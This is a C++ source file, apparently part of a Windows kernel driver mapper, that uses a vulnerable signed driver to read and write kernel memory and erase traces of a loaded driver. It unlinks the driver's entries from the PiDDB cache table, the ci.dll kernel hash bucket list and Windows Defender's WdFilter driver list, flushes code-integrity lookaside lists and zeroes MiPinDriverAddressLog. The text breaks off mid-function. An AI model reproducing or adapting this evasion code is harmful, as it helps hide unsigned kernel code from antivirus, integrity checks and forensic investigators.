#include "trace_cleaner.hpp"
#include "memory_manager.hpp"
#include "service_manager.hpp"
#include <iostream>
#include <vector>
#include <memory>
#include <set>

// forward declarations for external NT functions
extern "C" {
NTSTATUS NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass,
                                  PVOID SystemInformation, ULONG SystemInformationLength,
                                  PULONG ReturnLength);
NTSTATUS NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits,
                                 PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
NTSTATUS NtFreeVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize,
                             ULONG FreeType);
}

auto trace_cleaner_t::clean_all_traces(HANDLE device_handle, const std::string& driver_name)
    -> bool {
  bool success = true;
  mapper_log("SUCCESS", "starting trace cleaning process...");

  // clean PiDDB cache table
  if (!clear_piddb_cache_table(device_handle, driver_name)) {
    mapper_log("ERROR", "failed to clear PiDDB cache table");
    success = false;
  }

  // clean kernel hash bucket list
  if (!clear_kernel_hash_bucket_list(device_handle, driver_name)) {
    mapper_log("ERROR", "failed to clear kernel hash bucket list");
    success = false;
  }

  // clean MmUnloadedDrivers
  if (!clear_mm_unloaded_drivers(device_handle, driver_name)) {
    mapper_log("ERROR", "failed to clear MmUnloadedDrivers");
    success = false;
  }

  // clean WdFilter driver list
  if (!clear_wd_filter_driver_list(device_handle, driver_name)) {
    mapper_log("ERROR", "failed to clear WdFilter driver list");
    success = false;
  }

  // clean CI.dll EaCache and Validation lookaside lists
  if (!clear_ci_lookaside_lists(device_handle)) {
    mapper_log("ERROR", "failed to clear CI.dll EaCache and Validation lookaside list");
    success = false;
  }

  // dump MiPinDriverAddressLog, clear entries if 2nd argument is true
  if (!clear_pin_driver_address_log(device_handle, true)) {
    mapper_log("ERROR", "failed to enumerate MiPinDriverAddressLog");
    success = false;
  }

  return success;
}

auto trace_cleaner_t::clear_piddb_cache_table(HANDLE device_handle, const std::string& driver_name)
    -> bool {
  mapper_log("SUCCESS", "clearing PiDDB cache table...");

  auto piddb_lock_addr = g_driver_mapper->get_pdb_offsets().PiDDBLock;
  auto piddb_cache_table_addr = g_driver_mapper->get_pdb_offsets().PiDDBCacheTable;

  if (!piddb_lock_addr || !piddb_cache_table_addr) {
    mapper_log("ERROR", "failed to resolve PiDDB addresses");
    return false;
  }

  // acquire exclusive lock
  if (!acquire_resource_exclusive(device_handle, reinterpret_cast<void*>(piddb_lock_addr), true)) {
    mapper_log("ERROR", "failed to acquire PiDDB lock");
    return false;
  }

  // find the actual driver name and entry address by enumerating all entries
  auto [actual_driver_name, found_entry_addr] =
      find_driver_in_piddb_entries(device_handle, piddb_cache_table_addr);

  if (actual_driver_name.empty() || !found_entry_addr) {
    mapper_log("ERROR", "failed to find intel driver entry in PiDDB table");
    release_resource(device_handle, reinterpret_cast<void*>(piddb_lock_addr));
    return false;
  }

  mapper_log("SUCCESS", "found intel driver entry within PiDDB entries: %ws at address: 0x%llx",
             actual_driver_name.c_str(), found_entry_addr);

  // read the full entry to get LIST_ENTRY for unlinking
  piddb_cache_entry_t found_entry = {};
  if (!g_memory_manager->read_memory(device_handle, found_entry_addr, &found_entry,
                                     sizeof(found_entry))) {
    mapper_log("ERROR", "failed to read PiDDB entry");
    release_resource(device_handle, reinterpret_cast<void*>(piddb_lock_addr));
    return false;
  }

  if (!unlink_list_entry(device_handle, found_entry_addr)) {
    mapper_log("ERROR", "failed to unlink PiDDB entry from list");
    release_resource(device_handle, reinterpret_cast<void*>(piddb_lock_addr));
    return false;
  }

  // delete from AVL table
  if (!delete_element_generic_table_avl(device_handle,
                                        reinterpret_cast<void*>(piddb_cache_table_addr),
                                        reinterpret_cast<void*>(found_entry_addr))) {
    mapper_log("ERROR", "failed to delete from PiDDB AVL table");
    release_resource(device_handle, reinterpret_cast<void*>(piddb_lock_addr));
    return false;
  }

  // decrement delete count
  std::uint32_t delete_count = 0;
  if (g_memory_manager->read_memory(
          device_handle, piddb_cache_table_addr + offsetof(rtl_avl_table_t, delete_count),
          &delete_count, sizeof(std::uint32_t))) {
    if (delete_count > 0) {
      delete_count--;
      g_memory_manager->write_memory(
          device_handle, piddb_cache_table_addr + offsetof(rtl_avl_table_t, delete_count),
          &delete_count, sizeof(std::uint32_t));
    }
  }

  // release lock
  release_resource(device_handle, reinterpret_cast<void*>(piddb_lock_addr));

  mapper_log("SUCCESS", "PiDDB cache table cleaned successfully");
  return true;
}

auto trace_cleaner_t::print_pe_process_hash_bucket_list(HANDLE device_handle) -> bool {
  mapper_log("SUCCESS", "printing g_PEProcessHashBucketList contents...");

  std::uint64_t ci_base = g_utils->get_kernel_module_address("ci.dll");
  if (!ci_base) {
    mapper_log("ERROR", "failed to find ci.dll module");
    return false;
  }

  auto g_pe_process_hash_bucket_list = g_driver_mapper->get_pdb_offsets().g_PEProcessHashBucketList;
  auto g_hash_cache_lock = g_driver_mapper->get_pdb_offsets().g_HashCacheLock;

  if (!g_pe_process_hash_bucket_list || !g_hash_cache_lock) {
    mapper_log("ERROR", "failed to get g_PEProcessHashBucketList or g_HashCacheLock addresses");
    return false;
  }

  if (!acquire_resource_exclusive(device_handle, reinterpret_cast<void*>(g_hash_cache_lock),
                                  true)) {
    mapper_log("ERROR", "failed to lock g_HashCacheLock");
    return false;
  }

  // read the first bucket pointer (g_PEProcessHashBucketList is a pointer to the first bucket)
  pe_process_hash_bucket_t* current_bucket = nullptr;
  if (!g_memory_manager->read_memory(device_handle, g_pe_process_hash_bucket_list, &current_bucket,
                                     sizeof(current_bucket))) {
    mapper_log("ERROR", "failed to read g_PEProcessHashBucketList");
    release_resource(device_handle, reinterpret_cast<void*>(g_hash_cache_lock));
    return false;
  }

  if (!current_bucket) {
    mapper_log("SUCCESS", "g_PEProcessHashBucketList is empty");
    release_resource(device_handle, reinterpret_cast<void*>(g_hash_cache_lock));
    return true;
  }

  int bucket_count = 0;
  int total_entries = 0;

  // iterate through hash buckets (for ( k = g_PEProcessHashBucketList; k; k = (_QWORD *)*k ))
  while (current_bucket) {
    bucket_count++;
    mapper_log("INFO", "Processing bucket %d at address: 0x%llx", bucket_count,
               reinterpret_cast<std::uint64_t>(current_bucket));

    // read the full bucket header
    pe_process_hash_bucket_t bucket_header;
    if (!g_memory_manager->read_memory(device_handle,
                                       reinterpret_cast<std::uint64_t>(current_bucket),
                                       &bucket_header, sizeof(bucket_header))) {
      mapper_log("ERROR", "failed to read bucket header data");
      release_resource(device_handle, reinterpret_cast<void*>(g_hash_cache_lock));
      return false;
    }

    mapper_log("INFO", "  pid: %llu (0x%llx)",
               reinterpret_cast<std::uint64_t>(bucket_header.process_id),
               reinterpret_cast<std::uint64_t>(bucket_header.process_id));
    mapper_log("INFO", "  entry count: %d", bucket_header.entry_count);
    mapper_log("INFO", "  flag1 (offset 0x28): %d", bucket_header.flag1);
    mapper_log("INFO", "  flag2 (offset 0x2C): %d", bucket_header.flag2);

    // check if bucket has entries (if ( *((_DWORD *)k + 0xA) ))
    if (bucket_header.flag1) {
      hash_bucket_entry_t* current_entry = bucket_header.entry_list;
      int entry_count = 0;

      mapper_log("INFO", "  entry list starts at: 0x%llx",
                 reinterpret_cast<std::uint64_t>(current_entry));

      // iterate through entries in this bucket
      while (current_entry) {
        entry_count++;
        total_entries++;

        mapper_log("INFO", "    processing entry %d at address: 0x%llx", entry_count,
                   reinterpret_cast<std::uint64_t>(current_entry));

        // read the entry data
        hash_bucket_entry_t entry_data;
        if (!g_memory_manager->read_memory(device_handle,
                                           reinterpret_cast<std::uint64_t>(current_entry),
                                           &entry_data, sizeof(entry_data))) {
          mapper_log("ERROR", "failed to read entry data");
          release_resource(device_handle, reinterpret_cast<void*>(g_hash_cache_lock));
          return false;
        }

        // check entry flag at offset 0x40 (*((_DWORD *)v7 + 16) or v7[8] & flags)
        std::uint32_t entry_flag = 0;
        if (!g_memory_manager->read_memory(device_handle,
                                           reinterpret_cast<std::uint64_t>(current_entry) + 0x40,
                                           &entry_flag, sizeof(entry_flag))) {
          mapper_log("ERROR", "failed to read entry flag");
          release_resource(device_handle, reinterpret_cast<void*>(g_hash_cache_lock));
          return false;
        }

        mapper_log("INFO", "      entry flag (offset 0x40): 0x%X", entry_flag);

        // print certificate hash (from hash_bucket_entry_t.cert_hash)
        mapper_log("INFO", "      cert hash: %08X %08X %08X %08X %08X", entry_data.cert_hash[0],
                   entry_data.cert_hash[1], entry_data.cert_hash[2], entry_data.cert_hash[3],
                   entry_data.cert_hash[4]);

        // read the driver name
        USHORT name_len = 0;
        if (!g_memory_manager->read_memory(device_handle,
                                           reinterpret_cast<std::uint64_t>(current_entry) +
                                               offsetof(hash_bucket_entry_t, driver_name) +
                                               offsetof(UNICODE_STRING, Length),
                                           &name_len, sizeof(name_len))) {
          mapper_log("WARNING", "failed to read driver name length");
        } else if (name_len > 0 && name_len < 1024) {  // sanity check
          wchar_t* name_ptr = nullptr;
          if (!g_memory_manager->read_memory(device_handle,
                                             reinterpret_cast<std::uint64_t>(current_entry) +
                                                 offsetof(hash_bucket_entry_t, driver_name) +
                                                 offsetof(UNICODE_STRING, Buffer),
                                             &name_ptr, sizeof(name_ptr))) {
            mapper_log("WARNING", "failed to read driver name pointer");
          } else if (name_ptr) {
            auto driver_name = std::make_unique<wchar_t[]>(name_len / 2 + 1);
            if (!g_memory_manager->read_memory(device_handle,
                                               reinterpret_cast<std::uint64_t>(name_ptr),
                                               driver_name.get(), name_len)) {
              mapper_log("WARNING", "failed to read driver name string");
            } else {
              driver_name[name_len / 2] = L'\0';  // ensure null termination
              mapper_log("INFO", "      driver: %ws", driver_name.get());
            }
          }
        }

        // move to next entry in this bucket
        current_entry = entry_data.next;

        // safety check to prevent infinite loops
        if (entry_count > 1000) {
          mapper_log("WARNING", "too many entries in bucket, stopping enumeration");
          break;
        }
      }

      mapper_log("INFO", "  bucket %d contains %d entries", bucket_count, entry_count);
    } else {
      mapper_log("INFO", "  bucket %d has no active entries (flag1 = 0)", bucket_count);
    }

    // move to next bucket
    current_bucket = bucket_header.next;

    // safety check to prevent infinite loops
    if (bucket_count > 1000) {
      mapper_log("WARNING", "too many buckets, stopping enumeration");
      break;
    }
  }

  mapper_log("SUCCESS",
             "g_PEProcessHashBucketList enumeration complete. Total buckets: %d, Total entries: %d",
             bucket_count, total_entries);

  release_resource(device_handle, reinterpret_cast<void*>(g_hash_cache_lock));
  return true;
}

auto trace_cleaner_t::clear_pin_driver_address_log(HANDLE device_handle, bool clear_after_dump)
    -> bool {
  mapper_log("SUCCESS", "dumping MiPinDriverAddressLog raw contents...");

  std::uint64_t ntoskrnl_base = g_utils->get_kernel_module_address("ntoskrnl.exe");
  if (!ntoskrnl_base) {
    mapper_log("ERROR", "failed to find ntoskrnl.exe module");
    return false;
  }

  auto mi_pin_driver_address_log = g_driver_mapper->get_pdb_offsets().MiPinDriverAddressLog;
  if (!mi_pin_driver_address_log) {
    mapper_log("ERROR", "failed to get MiPinDriverAddressLog address");
    return false;
  }

  mapper_log("INFO", "MiPinDriverAddressLog address: 0x%llx", mi_pin_driver_address_log);

  const int max_entries = 0x800;
  const size_t total_size = max_entries * sizeof(std::uint64_t);

  // read the entire log array
  auto log_data = std::make_unique<std::uint64_t[]>(max_entries);
  if (!g_memory_manager->read_memory(device_handle, mi_pin_driver_address_log, log_data.get(),
                                     total_size)) {
    mapper_log("ERROR", "failed to read MiPinDriverAddressLog array");
    return false;
  }

  mapper_log("INFO", "=== MiPinDriverAddressLog ===");
  mapper_log("INFO", "array size: %d entries (%zu bytes)", max_entries, total_size);

  int non_zero_entries = 0;

  // dump everything that's not zero
  for (int i = 0; i < max_entries; i++) {
    if (log_data[i] != 0) {
      non_zero_entries++;

      // extract components
      std::uint32_t low_dword = log_data[i] & 0xFFFFFFFF;
      std::uint32_t high_dword = (log_data[i] >> 32) & 0xFFFFFFFF;

      // reconstruct the full address
      std::uint64_t full_address =
          (static_cast<std::uint64_t>(high_dword) << 32) | (low_dword & 0xFFFFF000);

      std::uint32_t flags = low_dword & 0xFFF;

      mapper_log("INFO", "entry %d: address=0x%llx, flags=0x%03X, raw=0x%016llX", i, full_address,
                 flags, log_data[i]);

      // identify the module
      if (full_address >= ntoskrnl_base && full_address < ntoskrnl_base + 0x2000000) {
        mapper_log("INFO", "  -> ntoskrnl.exe +0x%llx", full_address - ntoskrnl_base);
      } else if (full_address >= 0xFFFFF80000000000ULL) {
        mapper_log("INFO", "  -> driver address");
      } else if (full_address >= 0xFFFF800000000000ULL) {
        mapper_log("INFO", "  -> kernel space");
      } else if (full_address > 0x1000) {
        mapper_log("INFO", "  -> unk");
      }
    }
  }

  mapper_log("INFO", "total non-zero entries: %d", non_zero_entries);

  // clear the log if requested
  if (clear_after_dump) {
    mapper_log("INFO", "clearing MiPinDriverAddressLog...");

    // create a zeroed buffer
    auto zero_buffer = std::make_unique<char[]>(total_size);
    memset(zero_buffer.get(), 0, total_size);

    if (g_memory_manager->write_memory(device_handle, mi_pin_driver_address_log, zero_buffer.get(),
                                       total_size)) {
      mapper_log("SUCCESS", "MiPinDriverAddressLog cleared successfully");
    } else {
      mapper_log("ERROR", "failed to clear MiPinDriverAddressLog");
      return false;
    }
  }

  mapper_log("SUCCESS", "MiPinDriverAddressLog dump complete - found %d entries", non_zero_entries);
  return true;
}
auto trace_cleaner_t::clear_kernel_hash_bucket_list(HANDLE device_handle,
                                                    const std::string& driver_name) -> bool {
  mapper_log("SUCCESS", "clearing kernel hash bucket list...");

  std::uint64_t ci_base = g_utils->get_kernel_module_address("ci.dll");
  if (!ci_base) {
    mapper_log("ERROR", "failed to find ci.dll module");
    return false;
  }

  auto g_kernel_hash_bucket_list = g_driver_mapper->get_pdb_offsets().g_KernelHashBucketList;
  auto g_hash_cache_lock = g_driver_mapper->get_pdb_offsets().g_HashCacheLock;

  if (!g_kernel_hash_bucket_list || !g_hash_cache_lock) {
    mapper_log("ERROR", "failed to get g_HashCache addresses");
    return false;
  }

  if (!acquire_resource_exclusive(device_handle, reinterpret_cast<void*>(g_hash_cache_lock),
                                  true)) {
    mapper_log("ERROR", "failed to lock g_HashCacheLock");
    return false;
  }

  hash_bucket_entry_t* prev = reinterpret_cast<hash_bucket_entry_t*>(g_kernel_hash_bucket_list);
  hash_bucket_entry_t* entry = nullptr;

  if (!g_memory_manager->read_memory(device_handle, reinterpret_cast<std::uint64_t>(prev), &entry,
                                     sizeof(entry))) {
    mapper_log("ERROR", "failed to read first g_KernelHashBucketList entry");
    release_resource(device_handle, reinterpret_cast<void*>(g_hash_cache_lock));
    return false;
  }

  if (!entry) {
    mapper_log("SUCCESS", "g_KernelHashBucketList looks empty");

    release_resource(device_handle, reinterpret_cast<void*>(g_hash_cache_lock));
    return true;
  }

  // get driver name and path
  std::wstring wide_driver_name = g_service_manager->get_driver_name_w();
  std::wstring search_path = g_service_manager->get_driver_path();

  size_t expected_len = (search_path.length() - 2) * 2;

  while (entry) {
    USHORT ws_name_len = 0;
    if (!g_memory_manager->read_memory(device_handle,
                                       reinterpret_cast<std::uint64_t>(entry) +
                                           offsetof(hash_bucket_entry_t, driver_name) +
                                           offsetof(UNICODE_STRING, Length),
                                       &ws_name_len, sizeof(ws_name_len)) ||
        ws_name_len == 0) {
      mapper_log("ERROR", "failed to read g_KernelHashBucketList entry text len");
      release_resource(device_handle, reinterpret_cast<void*>(g_hash_cache_lock));
      return false;
    }

    if (expected_len == ws_name_len) {
      wchar_t* ws_name_ptr = nullptr;
      if (!g_memory_manager->read_memory(device_handle,
                                         reinterpret_cast<std::uint64_t>(entry) +
                                             offsetof(hash_bucket_entry_t, driver_name) +
                                             offsetof(UNICODE_STRING, Buffer),
                                         &ws_name_ptr, sizeof(ws_name_ptr)) ||
          !ws_name_ptr) {
        mapper_log("ERROR", "failed to read g_KernelHashBucketList entry text ptr");
        release_resource(device_handle, reinterpret_cast<void*>(g_hash_cache_lock));
        return false;
      }

      auto ws_name = std::make_unique<wchar_t[]>(ws_name_len / 2 + 1);
      if (!g_memory_manager->read_memory(device_handle,
                                         reinterpret_cast<std::uint64_t>(ws_name_ptr),
                                         ws_name.get(), ws_name_len)) {
        mapper_log("ERROR", "failed to read g_KernelHashBucketList entry text");
        release_resource(device_handle, reinterpret_cast<void*>(g_hash_cache_lock));
        return false;
      }

      size_t find_result = std::wstring(ws_name.get()).find(wide_driver_name);
      if (find_result != std::wstring::npos) {
        mapper_log("ERROR", "found in g_KernelHashBucketList: %ws",
                   std::wstring(&ws_name[find_result]).c_str());

        hash_bucket_entry_t* next = nullptr;
        if (!g_memory_manager->read_memory(device_handle, reinterpret_cast<std::uint64_t>(entry),
                                           &next, sizeof(next))) {
          mapper_log("ERROR", "failed to read g_KernelHashBucketList next entry ptr");
          release_resource(device_handle, reinterpret_cast<void*>(g_hash_cache_lock));
          return false;
        }

        if (!g_memory_manager->write_memory(device_handle, reinterpret_cast<std::uint64_t>(prev),
                                            &next, sizeof(next))) {
          mapper_log("ERROR", "failed to write g_KernelHashBucketList prev entry ptr");
          release_resource(device_handle, reinterpret_cast<void*>(g_hash_cache_lock));
          return false;
        }

        if (!free_pool_memory(device_handle, reinterpret_cast<std::uint64_t>(entry))) {
          mapper_log("ERROR", "failed to clear g_KernelHashBucketList entry pool");
          release_resource(device_handle, reinterpret_cast<void*>(g_hash_cache_lock));
          return false;
        }

        mapper_log("SUCCESS", "g_KernelHashBucketList cleaned");

        release_resource(device_handle, reinterpret_cast<void*>(g_hash_cache_lock));
        return true;
      }
    }

    prev = entry;
    // read next entry
    if (!g_memory_manager->read_memory(device_handle, reinterpret_cast<std::uint64_t>(entry),
                                       &entry, sizeof(entry))) {
      mapper_log("ERROR", "failed to read g_KernelHashBucketList next entry");
      release_resource(device_handle, reinterpret_cast<void*>(g_hash_cache_lock));
      return false;
    }
  }

  mapper_log("ERROR", "driver not found in kernel hash bucket list");

  release_resource(device_handle, reinterpret_cast<void*>(g_hash_cache_lock));
  return false;
}

auto trace_cleaner_t::clear_mm_unloaded_drivers(HANDLE device_handle,
                                                const std::string& driver_name) -> bool {
  return find_driver_in_unloaded_list(device_handle, driver_name);
}
auto trace_cleaner_t::clear_wd_filter_driver_list(HANDLE device_handle,
                                                  const std::string& driver_name) -> bool {
  mapper_log("SUCCESS", "clearing wdfilter.sys driver list");

  auto wide_driver_name = g_service_manager->get_driver_name_w();
  if (wide_driver_name.empty()) {
    mapper_log("ERROR", "driver name from service manager is empty");
    return false;
  }

  auto wd_filter = g_utils->get_kernel_module_address("WdFilter.sys");
  if (!wd_filter) {
    mapper_log("SUCCESS", "wdfilter.sys is not loaded, skipping trace clean");
    return true;
  }

  auto runtime_drivers_list = g_utils->find_pattern_in_section_at_kernel(
      device_handle, "PAGE", wd_filter, (unsigned char*)"\x48\x8B\x0D\x00\x00\x00\x00\xFF\x05",
      "xxx????xx");
  if (!runtime_drivers_list) {
    mapper_log("ERROR", "failed to find RuntimeDriversList pattern");
    return false;
  }

  auto runtime_drivers_count_ref = g_utils->find_pattern_in_section_at_kernel(
      device_handle, "PAGE", wd_filter, (unsigned char*)"\xFF\x05\x00\x00\x00\x00\x48\x39\x11",
      "xx????xxx");
  if (!runtime_drivers_count_ref) {
    mapper_log("ERROR", "failed to find RuntimeDriversCount pattern");
    return false;
  }

  auto mp_free_driver_info_ex_ref = g_utils->find_pattern_in_section_at_kernel(
      device_handle, "PAGE", wd_filter,
      (unsigned char*)"\x89\x00\x08\xE8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE9",
      "x?xx???????????x");
  if (!mp_free_driver_info_ex_ref) {
    mp_free_driver_info_ex_ref = g_utils->find_pattern_in_section_at_kernel(
        device_handle, "PAGE", wd_filter,
        (unsigned char*)"\x89\x00\x08\x00\x00\x00\xE8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                        "\xE9",
        "x?x???x???????????x");
    if (!mp_free_driver_info_ex_ref) {
      mapper_log("ERROR", "failed to find MpFreeDriverInfoEx pattern");
      return false;
    }
  }

  mp_free_driver_info_ex_ref += 0x3;

  runtime_drivers_list = reinterpret_cast<uintptr_t>(g_utils->resolve_relative_address(
      device_handle, reinterpret_cast<void*>(runtime_drivers_list), 3, 7));
  auto runtime_drivers_list_head = runtime_drivers_list - 0x8;
  auto runtime_drivers_count = reinterpret_cast<uintptr_t>(g_utils->resolve_relative_address(
      device_handle, reinterpret_cast<void*>(runtime_drivers_count_ref), 2, 6));
  auto runtime_drivers_array = runtime_drivers_count + 0x8;
  auto mp_free_driver_info_ex = g_utils->resolve_relative_address(
      device_handle, reinterpret_cast<void*>(mp_free_driver_info_ex_ref), 1, 5);

  g_memory_manager->read_memory(device_handle, runtime_drivers_array, &runtime_drivers_array,
                                sizeof(std::uintptr_t));

  auto read_list_entry = [&](std::uintptr_t address) -> LIST_ENTRY* {
    LIST_ENTRY* entry;
    if (!g_memory_manager->read_memory(device_handle, address, &entry, sizeof(LIST_ENTRY*))) {
      return nullptr;
    }
    return entry;
  };

  for (auto entry = read_list_entry(runtime_drivers_list_head);
       entry != reinterpret_cast<LIST_ENTRY*>(runtime_drivers_list_head);
       entry =
           read_list_entry(reinterpret_cast<std::uintptr_t>(entry) + offsetof(LIST_ENTRY, Flink))) {
    UNICODE_STRING unicode_string;
    g_memory_manager->read_memory(device_handle, reinterpret_cast<std::uintptr_t>(entry) + 0x10,
                                  &unicode_string, sizeof(UNICODE_STRING));

    auto image_name =
        std::make_unique<wchar_t[]>((std::uintptr_t)unicode_string.Length / 2ULL + 1ULL);
    g_memory_manager->read_memory(device_handle,
                                  reinterpret_cast<std::uintptr_t>(unicode_string.Buffer),
                                  image_name.get(), unicode_string.Length);

    image_name[unicode_string.Length / 2] = L'\0';

    if (wcsstr(image_name.get(), wide_driver_name.c_str())) {
      auto same_index_list =
          reinterpret_cast<void*>(reinterpret_cast<std::uintptr_t>(entry) - 0x10);

      bool removed_runtime_drivers_array = false;
      for (int k = 0; k < 256; k++) {
        void* value = nullptr;
        g_memory_manager->read_memory(device_handle, runtime_drivers_array + (k * 8), &value,
                                      sizeof(void*));
        if (value == same_index_list) {
          auto empty_val = reinterpret_cast<void*>(runtime_drivers_count + 1);
          g_memory_manager->write_memory(device_handle, runtime_drivers_array + (k * 8), &empty_val,
                                         sizeof(void*));
          removed_runtime_drivers_array = true;
          break;
        }
      }

      if (!removed_runtime_drivers_array) {
        mapper_log("ERROR", "failed to remove from RuntimeDriversArray");
        return false;
      }

      auto next_entry =
          read_list_entry(reinterpret_cast<std::uintptr_t>(entry) + offsetof(LIST_ENTRY, Flink));
      auto prev_entry =
          read_list_entry(reinterpret_cast<std::uintptr_t>(entry) + offsetof(LIST_ENTRY, Blink));

      g_memory_manager->write_memory(
          device_handle, reinterpret_cast<std::uintptr_t>(next_entry) + offsetof(LIST_ENTRY, Blink),
          &prev_entry, sizeof(LIST_ENTRY::Blink));
      g_memory_manager->write_memory(
          device_handle, reinterpret_cast<std::uintptr_t>(prev_entry) + offsetof(LIST_ENTRY, Flink),
          &next_entry, sizeof(LIST_ENTRY::Flink));

      ULONG current = 0;
      g_memory_manager->read_memory(device_handle, runtime_drivers_count, &current, sizeof(ULONG));
      current--;
      g_memory_manager->write_memory(device_handle, runtime_drivers_count, &current, sizeof(ULONG));

      auto driver_info = reinterpret_cast<std::uintptr_t>(entry) - 0x20;
      USHORT magic = 0;
      g_memory_manager->read_memory(device_handle, driver_info, &magic, sizeof(USHORT));

      if (magic == 0xDA18) {
        g_memory_manager->call_kernel_function<void>(
            device_handle, nullptr, reinterpret_cast<uintptr_t>(mp_free_driver_info_ex),
            driver_info);
      }

      mapper_log("SUCCESS", "wdfilter.sys driver list cleaned");

      return true;
    }
  }

  return false;
}

auto trace_cleaner_t::clear_ci_lookaside_lists(HANDLE device_handle) -> bool {
  mapper_log("SUCCESS", "clearing CI.dll EaCache lookaside list...");

  // get the offset for g_CiEaCacheLookasideList
  auto g_ci_ea_cache_lookaside_list_offset =
      g_driver_mapper->get_pdb_offsets().g_CiEaCacheLookasideList;
  if (!g_ci_ea_cache_lookaside_list_offset) {
    mapper_log("ERROR", "failed to get g_CiEaCacheLookasideList offset");
    return false;
  }

  // get the offset for g_CiValidationLookasideList
  auto g_ci_validation_lookaside_list_offset =
      g_driver_mapper->get_pdb_offsets().g_CiValidationLookasideList;
  if (!g_ci_validation_lookaside_list_offset) {
    mapper_log("ERROR", "failed to get g_CiValidationLookasideList offset");
    return false;
  }

  static std::uint64_t kernel_ex_flush_lookaside_list_ex = 0;
  if (!kernel_ex_flush_lookaside_list_ex) {
    kernel_ex_flush_lookaside_list_ex = g_utils->get_kernel_module_export(
        device_handle, g_driver_mapper->get_ntoskrnl_base(), "ExFlushLookasideListEx");
    if (!kernel_ex_flush_lookaside_list_ex) {
      mapper_log("ERROR", "failed to find ExFlushLookasideListEx");
      return false;
    }
  }

  // flush the ea cache lookaside list
  if (!g_memory_manager->call_kernel_function<void>(device_handle, nullptr,
                                                    kernel_ex_flush_lookaside_list_ex,
                                                    g_ci_ea_cache_lookaside_list_offset)) {
    mapper_log("ERROR", "failed to flush ea cache lookaside list");
    return false;
  }

  // flush the validation lookaside list
  if (!g_memory_manager->call_kernel_function<void>(device_handle, nullptr,
                                                    kernel_ex_flush_lookaside_list_ex,
                                                    g_ci_validation_lookaside_list_offset)) {
    mapper_log("ERROR", "failed to flush validation lookaside list");
    return false;
  }

  mapper_log("SUCCESS", "CI.dll EaCache and Validation lookaside lists flushed successfully");
  return true;
}

auto trace_cleaner_t::acquire_resource_exclusive(HANDLE device_handle, void* resource, bool wait)
    -> bool {
  if (!resource) {
    return false;
  }

  static std::uint64_t kernel_ex_acquire_resource_exclusive_lite = 0;

  if (!kernel_ex_acquire_resource_exclusive_lite) {
    kernel_ex_acquire_resource_exclusive_lite = g_utils->get_kernel_module_export(
        device_handle, g_driver_mapper->get_ntoskrnl_base(), "ExAcquireResourceExclusiveLite");
    if (!kernel_ex_acquire_resource_exclusive_lite) {
      return false;
    }
  }

  BOOLEAN result = FALSE;
  return g_memory_manager->call_kernel_function(
             device_handle, &result, kernel_ex_acquire_resource_exclusive_lite, resource, wait) &&
         result;
}

auto trace_cleaner_t::release_resource(HANDLE device_handle, void* resource) -> bool {
  if (!resource) {
    return false;
  }

  static std::uint64_t kernel_ex_release_resource_lite = 0;

  if (!kernel_ex_release_resource_lite) {
    kernel_ex_release_resource_lite = g_utils->get_kernel_module_export(
        device_handle, g_driver_mapper->get_ntoskrnl_base(), "ExReleaseResourceLite");
    if (!kernel_ex_release_resource_lite) {
      return false;
    }
  }

  return g_memory_manager->call_kernel_function<void>(device_handle, nullptr,
                                                      kernel_ex_release_resource_lite, resource);
}

auto trace_cleaner_t::lookup_element_generic_table_avl(HANDLE device_handle,
                                                       rtl_avl_table_t* table_addr,
                                                       piddb_cache_entry_t* local_entry)
    -> std::uint64_t {
  static std::uint64_t kernel_rtl_lookup_element_generic_table_avl = 0;

  if (!kernel_rtl_lookup_element_generic_table_avl) {
    kernel_rtl_lookup_element_generic_table_avl = g_utils->get_kernel_module_export(
        device_handle, g_driver_mapper->get_ntoskrnl_base(), "RtlLookupElementGenericTableAvl");
    if (!kernel_rtl_lookup_element_generic_table_avl) {
      mapper_log("ERROR", "failed to find RtlLookupElementGenericTableAvl");
      return 0;
    }
  }

  std::uint64_t result_addr = 0;

  if (!g_memory_manager->call_kernel_function(
          device_handle, &result_addr, kernel_rtl_lookup_element_generic_table_avl,
          table_addr,                                       // Table address
          reinterpret_cast<std::uint64_t>(local_entry))) {  // Buffer address
    mapper_log("ERROR", "call_kernel_function failed");
    return 0;
  }

  return result_addr;
}

auto trace_cleaner_t::delete_element_generic_table_avl(HANDLE device_handle, void* table,
                                                       void* buffer) -> bool {
  if (!table) {
    return false;
  }

  static std::uint64_t kernel_rtl_delete_element_generic_table_avl = 0;

  if (!kernel_rtl_delete_element_generic_table_avl) {
    kernel_rtl_delete_element_generic_table_avl = g_utils->get_kernel_module_export(
        device_handle, g_driver_mapper->get_ntoskrnl_base(), "RtlDeleteElementGenericTableAvl");
    if (!kernel_rtl_delete_element_generic_table_avl) {
      return false;
    }
  }

  BOOLEAN result = FALSE;
  return g_memory_manager->call_kernel_function(
             device_handle, &result, kernel_rtl_delete_element_generic_table_avl, table, buffer) &&
         result;
}

auto trace_cleaner_t::unlink_list_entry(HANDLE device_handle, std::uint64_t entry_addr) -> bool {
  LIST_ENTRY* prev_entry = nullptr;
  LIST_ENTRY* next_entry = nullptr;

  // read the Flink (next entry pointer) from current entry
  if (!g_memory_manager->read_memory(device_handle, entry_addr + offsetof(LIST_ENTRY, Flink),
                                     &next_entry, sizeof(LIST_ENTRY*))) {
    mapper_log("ERROR", "failed to read Flink from entry");

    return false;
  }

  // read the Blink (previous entry pointer) from current entry
  if (!g_memory_manager->read_memory(device_handle, entry_addr + offsetof(LIST_ENTRY, Blink),
                                     &prev_entry, sizeof(LIST_ENTRY*))) {
    mapper_log("ERROR", "failed to read Blink from entry");
    return false;
  }

  // validate the pointers
  if (!next_entry || !prev_entry) {
    mapper_log("ERROR", "invalid list entry pointers (null)");
    return false;
  }

  // check for self-referencing (single entry in list)
  if (next_entry == reinterpret_cast<LIST_ENTRY*>(entry_addr) &&
      prev_entry == reinterpret_cast<LIST_ENTRY*>(entry_addr)) {
    return true;
  }

  // update next_entry->Blink = prev_entry
  if (!g_memory_manager->write_memory(
          device_handle, reinterpret_cast<std::uint64_t>(next_entry) + offsetof(LIST_ENTRY, Blink),
          &prev_entry, sizeof(LIST_ENTRY*))) {
    mapper_log("ERROR", "failed to update next->Blink");
    return false;
  }

  // update prev_entry->Flink = next_entry
